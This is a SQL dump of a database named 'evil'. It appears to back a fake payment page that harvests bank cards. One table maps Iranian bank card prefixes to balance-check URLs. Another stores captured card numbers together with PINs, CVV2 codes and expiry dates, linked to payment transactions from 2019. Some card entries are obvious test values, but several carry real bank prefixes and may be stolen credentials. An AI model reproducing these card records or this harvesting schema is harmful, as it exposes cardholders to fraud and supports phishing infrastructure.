-- --------------------------------------------------------
-- Host:                         127.0.0.1
-- Server version:               10.1.40-MariaDB - mariadb.org binary distribution
-- Server OS:                    Win64
-- HeidiSQL Version:             10.1.0.5464
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;


-- Dumping database structure for evil
CREATE DATABASE IF NOT EXISTS `evil` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `evil`;

-- Dumping structure for table evil.banks
CREATE TABLE IF NOT EXISTS `banks` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `CardNo` varchar(6) NOT NULL,
  `Name` varchar(50) NOT NULL,
  `Logo` varchar(50) NOT NULL,
  `Website` varchar(256) DEFAULT '#',
  `USSD` varchar(256) DEFAULT '#',
  `TBank` varchar(256) DEFAULT '#',
  `Fetchable` bit(1) NOT NULL,
  PRIMARY KEY (`Id`),
  UNIQUE KEY `IDX_CardNo` (`CardNo`)
) ENGINE=InnoDB AUTO_INCREMENT=48 DEFAULT CHARSET=utf8;

-- Dumping data for table evil.banks: ~46 rows (approximately)
/*!40000 ALTER TABLE `banks` DISABLE KEYS */;
INSERT INTO `banks` (`Id`, `CardNo`, `Name`, `Logo`, `Website`, `USSD`, `TBank`, `Fetchable`) VALUES
	(1, '610433', 'Mellat', 'mellat.png', '#', '*720#', '021 8132', b'0'),
	(2, '589905', 'Melli', 'melli.png', 'https://web.bale.ai/', '*717#', '09622', b'0'),
	(3, '170019', 'Melli', 'melli.png', 'https://web.bale.ai/', '*717#', '09622', b'0'),
	(4, '603799', 'Melli', 'melli.png', 'https://web.bale.ai/', '*717#', '09622', b'0'),
	(5, '603769', 'Saderat', 'saderat.png', '#', '*719#', '09602', b'0'),
	(6, '639217', 'Keshavarzi', 'keshavarzi.png', 'https://ib.bki.ir/pid46.lmx', '*730#', '09603', b'1'),
	(7, '603770', 'Keshavarzi', 'keshavarzi.png', 'https://ib.bki.ir/pid46.lmx', '*730#', '09603', b'1'),
	(8, '589210', 'Sepah', 'sepah.png', 'https://ib.ebanksepah.ir/desktop/sepahPages/shetabCard.sepah', '#', '021 64058', b'1'),
	(9, '627353', 'Tejarat', 'tejarat.png', 'https://pg.tejaratbank.ir/paymentGateway/getBalance', '#', '021 81277', b'1'),
	(10, '585983', 'Tejarat', 'tejarat.png', 'https://pg.tejaratbank.ir/paymentGateway/getBalance', '#', '021 81277', b'1'),
	(11, '628023', 'Maskan', 'maskan.png', '#', '*714#, *737#', '021 64096', b'0'),
	(12, '207177', 'Tose\'e Saderat', 'tose_saderat.png', '#', '#', '021 2722', b'0'),
	(13, '627648', 'Tose\'e Saderat', 'tose_saderat.png', '#', '#', '021 2722', b'0'),
	(14, '627961', 'Sanat & Madan', 'sanat_madan.png', '#', '*719#', '021 75024', b'0'),
	(15, '627760', 'Post Bank', 'postbank.png', '#', '*747#', '021 84284', b'0'),
	(16, '621986', 'Saman', 'saman.png', '#', '*724#', '021 6422', b'0'),
	(17, '627412', 'Eghtesade Novin', 'eghtesad_novin.png', 'https://modern.enbank.net/CustomerManager/viewLogin.html', '#', '021 85292', b'0'),
	(18, '639347', 'Pasargad', 'pasargad.png', 'https://epay.bpi.ir/balanceinquiry.aspx', '*720#', '021 828991111', b'1'),
	(19, '502229', 'Pasargad', 'pasargad.png', 'https://epay.bpi.ir/balanceinquiry.aspx', '*720#', '021 828991111', b'1'),
	(20, '639607', 'Sarmaye', 'sarmaye.png', 'https://pg.sbank.ir/balanceRequest.do', '#', '021 8254', b'0'),
	(21, '627488', 'Kar Afarin', 'karafarin.png', '#', '#', '021 23640', b'0'),
	(22, '502910', 'Kar Afarin', 'karafarin.png', '#', '#', '021 23640', b'0'),
	(23, '639194', 'Parsian', 'parsian.png', '#', '*708#', '021 89111', b'0'),
	(24, '622106', 'Parsian', 'parsian.png', '#', '*708#', '021 89111', b'0'),
	(26, '627884', 'Parsian', 'parsian.png', '#', '*708#', '021 89111', b'0'),
	(27, '639346', 'Sina', 'sina.png', 'https://sina24h.com/CustomerService2/viewLogin.html', '*727#', '021 82487', b'1'),
	(28, '589463', 'Refah', 'refah.png', '#', '*729#', '021 84043000', b'0'),
	(29, '628157', 'Etebari Tose\'e', 'etebari_tose.png', '#', '#', '021 81461', b'0'),
	(30, '504706', 'Shahr', 'shahr.png', 'https://ebank.city-bank.net/customermanager/viewLogin.html', '*787#', '021 87611', b'0'),
	(31, '502806', 'Shahr', 'shahr.png', 'https://ebank.city-bank.net/customermanager/viewLogin.html', '*787#', '021 87611', b'0'),
	(32, '502908', 'Tose\'e Ta\'avon', 'tose_teavon.png', 'https://epayment.ttbank.ir', '#', '#', b'0'),
	(33, '502938', 'Dey', 'dey.png', '#', '#', '021 2726', b'0'),
	(34, '606373', 'Gharzol Hasane Mehr', 'gharzolhasane_mehr.png', '#', '#', '021 8528', b'0'),
	(35, '639370', 'Etebari Mehr', 'etebari_mehr.png', 'https://modern.qmbi24.com/customermngr/viewLogin.html', '#', '021 8989', b'0'),
	(36, '627381', 'Ansar', 'ansar.png', 'https://ebank.ansarbank.com/customermanager/viewLogin.html', '*763#', '021 48049', b'1'),
	(37, '636214', 'Ayandeh', 'ayandeh.png', '#', '*745#', '021 2957', b'0'),
	(38, '636949', 'Hekmat Iranian', 'hekmat_iranian.png', '#', '#', '021 89555', b'0'),
	(39, '505785', 'Iran Zamin', 'iran_zamin.png', '#', '#', '021 24760', b'0'),
	(40, '505416', 'Gardeshgari', 'gardeshgari.png', 'https://epayment.tourism-bank.com/BalanceInquiry.aspx', '*764#', '021 22630345', b'1'),
	(41, '636795', 'Markazi', 'markazi.png', '#', '#', '#', b'0'),
	(42, '504172', 'Resalat', 'resalat.png', '#', '#', '#', b'0'),
	(43, '505801', 'Kowsar', 'kosar.png', '#', '*744#', '021 86777', b'0'),
	(44, '505809', 'Khavarmianeh', 'khavarmianeh.png', '#', '#', '#', b'0'),
	(45, '507677', 'Noor', 'noor.png', '#', '#', '#', b'0'),
	(46, '606256', 'Melal', 'melal.png', '#', '#', '#', b'0'),
	(47, '639599', 'Ghavamin', 'ghavamin.png', '#', '#', '021 84270', b'0');
/*!40000 ALTER TABLE `banks` ENABLE KEYS */;

-- Dumping structure for table evil.credit_cards
CREATE TABLE IF NOT EXISTS `credit_cards` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `RefId` varchar(16) NOT NULL,
  `MessageId` varchar(16) NOT NULL,
  `CardNumber` varchar(16) NOT NULL,
  `Pin` varchar(12) NOT NULL,
  `CVV2` varchar(4) NOT NULL,
  `ExpireMonth` varchar(2) NOT NULL,
  `ExpireYear` varchar(2) NOT NULL,
  `Email` varchar(128) DEFAULT NULL,
  `Balance` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`Id`),
  KEY `IDX_RefId` (`RefId`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- Dumping data for table evil.credit_cards: ~9 rows (approximately)
/*!40000 ALTER TABLE `credit_cards` DISABLE KEYS */;
INSERT INTO `credit_cards` (`Id`, `RefId`, `MessageId`, `CardNumber`, `Pin`, `CVV2`, `ExpireMonth`, `ExpireYear`, `Email`, `Balance`) VALUES
	(1, 'CA8F20D0B3DD031A', '6', '1111222233334444', '111111111111', '1111', '01', '00', 'Unknown', 0),
	(2, 'C5CE50F5A0D8FA3E', '7', '5029081039803131', '1234567890', '1234', '09', '99', 'TestMikonim@ApiRo.com', 0),
	(3, '351B2C66FEF45CA5', '10', '1111222233334444', '1111', '111', '01', '00', 'Unknown', 0),
	(4, '48B2CF3E7EAFF38B', '11', '6037997472666008', '112233', '123', '10', '00', 'Unknown', 0),
	(5, 'E12A8AE4DD6E8153', '14', '6037997472666008', '123456', '1234', '12', '00', 'Unknown', 0),
	(6, '90EEC61935016153', '15', '6273811089369943', '1870964', '651', '03', '99', 'Unknown', 0),
	(7, '9B13F3C948360189', '17', '6037991753174733', ' 14789', '4534', '01', '01', 'Unknown', 0),
	(8, 'DFAD8EB69693BCA1', '19', '6037991890851896', '12300', '6400', '06', '98', 'Unknown', 0),
	(9, '070958EFFB8C98B8', '23', '1111222233334444', '111111111111', '1111', '11', '00', 'Unknown', 0);
/*!40000 ALTER TABLE `credit_cards` ENABLE KEYS */;

-- Dumping structure for table evil.transactions
CREATE TABLE IF NOT EXISTS `transactions` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `RefId` varchar(16) NOT NULL,
  `Request` tinyint(4) NOT NULL,
  `SaleOrderId` int(9) NOT NULL,
  `Amount` int(11) NOT NULL,
  `Completed` bit(1) NOT NULL,
  `CreationTime` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `UpdatedTime` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`Id`),
  UNIQUE KEY `IDX_RefId` (`RefId`)
) ENGINE=InnoDB AUTO_INCREMENT=62 DEFAULT CHARSET=utf8;

-- Dumping data for table evil.transactions: ~23 rows (approximately)
/*!40000 ALTER TABLE `transactions` DISABLE KEYS */;
INSERT INTO `transactions` (`Id`, `RefId`, `Request`, `SaleOrderId`, `Amount`, `Completed`, `CreationTime`, `UpdatedTime`) VALUES
	(1, 'CA8F20D0B3DD031A', 0, 627868814, 10000, b'1', '2019-06-01 12:10:04', '2019-06-01 12:21:05'),
	(5, 'C5CE50F5A0D8FA3E', 0, 413963426, 10000, b'1', '2019-06-01 12:33:07', '2019-06-01 12:33:37'),
	(6, '4EC86959E95CF706', 0, 791165127, 10000, b'0', '2019-06-01 12:39:57', '2019-06-01 12:39:57'),
	(8, '351B2C66FEF45CA5', 0, 32255790, 10000, b'1', '2019-06-01 12:43:57', '2019-06-01 12:44:21'),
	(12, 'BC9B0CC9717897FE', 0, 317369950, 10000, b'0', '2019-06-01 12:44:59', '2019-06-01 12:44:59'),
	(14, '8BE38211A9A57CE6', 0, 465593637, 10000, b'0', '2019-06-01 12:45:27', '2019-06-01 12:45:27'),
	(19, '511E765AE0E5DF12', 0, 80333217, 10000, b'0', '2019-06-01 12:47:59', '2019-06-01 12:47:59'),
	(30, '48B2CF3E7EAFF38B', 0, 977678341, 10000, b'1', '2019-06-01 12:53:28', '2019-06-01 12:54:31'),
	(31, 'E12A8AE4DD6E8153', 0, 193323176, 10000, b'1', '2019-06-01 13:26:20', '2019-06-01 13:26:49'),
	(32, '90EEC61935016153', 0, 106456358, 10000, b'1', '2019-06-01 13:30:51', '2019-06-01 13:31:36'),
	(33, '9B13F3C948360189', 0, 969583698, 10000, b'1', '2019-06-01 14:01:57', '2019-06-01 14:03:21'),
	(37, '6B18C32572239F69', 0, 397762821, 10000, b'1', '2019-06-01 16:48:30', '2019-06-01 16:48:37'),
	(38, '2076D5CD84A865A6', 0, 938502870, 10000, b'1', '2019-06-01 20:20:01', '2019-06-01 20:32:35'),
	(40, 'DFAD8EB69693BCA1', 0, 895521320, 10000, b'1', '2019-06-01 20:33:33', '2019-06-01 20:36:36'),
	(47, '2D1256B3507B54C0', 0, 903395009, 10000, b'0', '2019-06-01 22:31:39', '2019-06-01 22:31:39'),
	(49, '3102521E1950C57C', 0, 717163093, 10000, b'0', '2019-06-01 22:31:59', '2019-06-01 22:31:59'),
	(52, 'C930EFE4E8AF7707', 0, 985355855, 10000, b'0', '2019-06-01 22:38:36', '2019-06-01 22:38:36'),
	(53, 'F1BB1B8F358ABEC7', 0, 543115950, 10000, b'0', '2019-06-01 22:51:43', '2019-06-01 22:51:43'),
	(55, '4465F5BAAB1C7DDE', 0, 781906146, 10000, b'0', '2019-06-01 23:13:27', '2019-06-01 23:13:27'),
	(58, '15AEB58CC572F0E7', 0, 781930722, 10000, b'0', '2019-06-01 23:41:13', '2019-06-01 23:41:13'),
	(59, '748199F1043870B1', 0, 41109754, 10000, b'0', '2019-06-01 23:54:32', '2019-06-01 23:54:32'),
	(60, 'B254165E71A206B9', 0, 391021702, 10000, b'0', '2019-06-02 00:08:56', '2019-06-02 00:08:56'),
	(61, '070958EFFB8C98B8', 0, 88767154, 10000, b'1', '2019-06-02 00:18:39', '2019-06-02 00:19:00');
/*!40000 ALTER TABLE `transactions` ENABLE KEYS */;

/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, '') */;
/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
